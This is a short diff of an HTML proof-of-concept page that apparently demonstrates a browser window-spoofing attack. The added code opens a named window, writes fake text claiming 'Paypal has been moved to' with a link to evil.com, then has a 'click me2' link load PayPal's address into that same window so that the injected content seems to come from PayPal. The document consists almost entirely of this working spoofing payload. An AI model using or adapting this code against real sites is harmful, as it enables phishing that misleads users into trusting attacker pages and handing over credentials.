@@ -1,8 +1,8 @@
 <script>
-    window.onclick = function () {
-        x = window.open('https://paypal.com');
-        setTimeout(function () {
-            x.document.write(`<h1>POC</h1>`)
-        }, 1);
-    }
-    </script>
+function pwned() {
+var t = window.open('', 'ss');
+t.document.write(`<h1>Paypal has been moved to</h1><a href="https://evil.com">Evil.com</a>`);
+t.stop();
+}
+</script>
+<a href="https://Paypal.com" target="ss" onclick="setTimeout('pwned()','500')">click me2</a>
